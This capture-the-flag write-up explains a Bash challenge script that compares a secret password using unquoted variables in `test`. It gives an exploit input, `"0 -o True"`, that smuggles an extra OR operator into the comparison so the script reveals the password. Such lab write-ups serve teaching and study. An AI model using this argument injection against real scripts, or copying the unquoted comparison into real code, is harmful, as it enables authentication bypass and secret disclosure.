# Bash - unquoted expression injection

## Statement :

Bypass this script's security to recover the validation password.

## Analysis

We're given the script's source code :

```bash
#!/bin/bash

#PATH=$(/usr/bin/getconf PATH || /bin/kill $$)
PATH="/bin:/usr/bin"

PASS=$(cat .passwd)

if test -z "${1}"; then
    echo "USAGE : $0 [password]"
    exit 1
fi

if test $PASS -eq ${1} 2>/dev/null; then
    echo "Well done you can validate the challenge with : $PASS"
else
    echo "Try again ,-)"
fi

exit 0
```

The vulnerability is on this line:

```bash
if test $PASS -eq ${1} 2>/dev/null; then
```

$PASS is **not quoted**. When test evaluates the expression, the shell expands $PASS and our input before test sees them. Since neither is quoted, word splitting occurs, meaning we can inject additional arguments into the test command.

The -eq operator performs an integer comparison, so under normal circumstances we'd need to guess the password. But because of the missing quotes, we can inject extra test operators.

## Exploit

```bash
./wrapper "0 -o True"
```

After word splitting, the test command receives:

```
test <PASS> -eq 0 -o True
```

This becomes two conditions joined by -o (logical OR):
- `<PASS> -eq 0` : this may or may not be true
- `True` : a non-empty string, which test always evaluates as **true**

Since one side of the OR is always true, the whole expression is true regardless of the actual password, and the script prints it:

```
app-script-ch16@challenge02:~$ ./wrapper "0 -o True"
Well done you can validate the challenge with : *
```
